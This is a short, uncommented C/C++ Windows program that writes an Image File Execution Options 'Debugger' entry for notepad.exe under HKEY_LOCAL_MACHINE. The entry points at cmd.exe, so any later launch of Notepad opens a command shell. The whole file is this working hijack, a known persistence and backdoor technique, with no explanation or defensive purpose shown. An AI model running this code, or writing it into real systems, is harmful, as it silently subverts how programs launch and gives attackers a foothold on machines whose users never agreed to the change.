#include<stdio.h>
#include<windows.h>
int main(){
	HKEY phkResult;
	const char buffer[] = "cmd.exe";
	DWORD dis;
	DWORD result = ::RegCreateKeyEx(
		HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&phkResult,
		&dis);
	if(result !=ERROR_SUCCESS){
		printf("wrong");
		return -1;
	}
	else{
		printf("hh");
	}
	::RegSetValueEx(phkResult,"Debugger",NULL,REG_SZ,(BYTE*)buffer,sizeof(buffer));
	::RegCloseKey(phkResult);
	return 0;
}